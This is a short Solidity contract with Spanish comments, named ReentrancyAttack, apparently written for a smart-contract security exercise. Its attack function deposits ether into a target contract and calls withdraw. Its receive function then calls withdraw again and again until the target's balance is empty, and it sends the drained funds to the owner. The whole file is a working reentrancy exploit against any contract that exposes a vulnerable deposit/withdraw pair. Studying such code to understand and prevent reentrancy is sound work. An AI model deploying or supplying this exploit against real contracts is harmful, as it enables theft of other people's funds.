// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ITokenReentrancy {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    // Variables
    ITokenReentrancy public target;
    address public owner;

    // Constuctor
    constructor(address _target) {
        target = ITokenReentrancy(_target);
        owner = msg.sender;
    }

    // Funcion de ataque
    function attack() public payable {
        require(msg.sender == owner, "Not owner");
        // Depositar saldo inicial
        target.deposit{value: msg.value}();
        // Llamada a retirar fondos 
        target.withdraw();  
    }

    // Sentencia Receive -> Al recibir creditos llama otra vez a retirar fondos
    receive() external payable {
        // Verificar si hay creditos en la cuenta de destino
        if (address(target).balance > 0) {
            // Si hay fondos llamar a retirar fondos 
            target.withdraw();

        // Si no hay fondos en el contrato destino retirar creditos
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}